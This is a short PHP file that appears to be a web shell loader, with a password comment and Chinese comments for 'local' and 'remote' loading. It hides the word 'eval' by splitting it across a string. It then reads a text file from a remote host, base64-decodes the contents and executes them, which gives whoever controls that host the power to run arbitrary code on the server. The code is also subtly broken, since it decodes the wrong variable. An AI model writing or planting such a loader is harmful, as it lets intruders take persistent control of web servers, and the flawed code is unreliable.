<?php 
//Password: admine21
//本地加载
function O0O00Oo0o(){
	$x = "eva";
	return $x."l(\$O0O0o0O0oO000Oo);";
}
//远程加载
$a=fopen('http://lab.local.me/admine21.txt','r');
$b='';
while(false!=($c=fread($a,8080)))
{$b.=$c;}
$O0O0o0O0oO000Oo = base64_decode($c);
print(eval(O0O00Oo0o()));
fclose($a);
?>